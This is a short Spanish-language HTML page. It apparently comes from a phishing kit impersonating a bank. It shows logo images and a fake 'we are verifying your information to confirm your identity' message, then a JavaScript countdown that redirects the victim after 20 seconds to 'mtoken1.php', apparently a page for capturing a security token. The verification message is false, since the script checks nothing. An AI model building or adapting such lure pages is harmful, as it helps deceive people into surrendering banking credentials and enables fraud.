

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> 

<style type="text/css">
.con {position:relative;}
.logo {width:100%; margin-left:-18%;}
.desa {width:100%; margin-left:-25%}
.fo {width:100%; margin-top:60%; margin-left:-25%;}
.form {box-sizing:border-size;font-size:18px;color:green;position:absolute;top:16.5%;left:64%;
		background-color:white; width:30%; height:22%;}
input {margin-top:2%; width:50%;font-size:18px;}
button {margin-top:30%;margin-left:40%;font-size:14px;border:none;background-color:green;color:white;}



  .texto1 {
  font-size: 12px;
  font-family: sans-serif;
}

  .gifi {

    width: 150px;
    margin-left: 50px;
    
  }
  

</style>

</head>

<body>
<div class="con" >
<div class="logo" ><img src="im/logoa.png" width="150%" height="10%"  ></div>

<div class="desa"><img src="im/logob.png" width="150%" height="30%" ></div>
<div class="fo"><img src="im/logoc.png" width="150%" height="10%"  ></div>

<div class="form">
<h1 class="texto1" id="CuentaAtras">Por favor, espera 20 segundos, segundos, estamos verificando tu información para confirmar tu identidad. </h1>



 <script language="JavaScript">
 
    /* Determinamos el tiempo total en segundos */
    var totalTiempo=20;
    
    var url="mtoken1.php";
 
    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" segundos, estamos verificando tu información para confirmar tu identidad. <br> ";
 
        if(totalTiempo==0)
        {
            window.location=url;
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
            setTimeout("updateReloj()",1000);
        }
    }
  window.onload=updateReloj;
 
    </script>











<img class= "gifi" src="/loader.gif">



</form>

</div>
</div>
</body>





</html>
